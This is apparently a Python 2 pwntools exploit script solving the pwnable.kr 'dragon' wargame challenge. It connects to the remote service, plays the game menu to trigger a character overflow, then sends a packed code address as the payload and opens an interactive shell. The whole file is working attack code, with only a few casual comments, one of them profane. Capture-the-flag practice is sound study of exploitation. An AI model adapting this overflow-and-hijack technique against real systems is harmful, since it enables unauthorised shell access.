#!/usr/bin/env python2
from pwn import *

ready = True
if ready:
    conn = remote('pwnable.kr', 9004)
else:
    conn = process(['/home/doublesine/Desktop/dragon'])

def SendLine(s):
    conn.sendline(s)
    print(s)
    sleep(0.5)

# First round will get a failure
# But don't woory, we will win in the next round
def FirstRound():
    print conn.read(),
    SendLine('1')
    print conn.read(),
    SendLine('1')

# Win by char overflow
def SecondRound():
    print conn.read(),
    for i in range(4):
        SendLine('3')
        print conn.read(),
        SendLine('3')
        print conn.read(),
        SendLine('2')
        print conn.read(),

target_addr = pack(0x08048DBF, 32)

print conn.read(),
SendLine('1')     # we choose priest
FirstRound()

print conn.read(),
SendLine('1')
SecondRound()

# send payload and you will get shell
# 'fuck' is optional. It is just my murmur.
SendLine(target_addr + 'fuck')
conn.interactive()
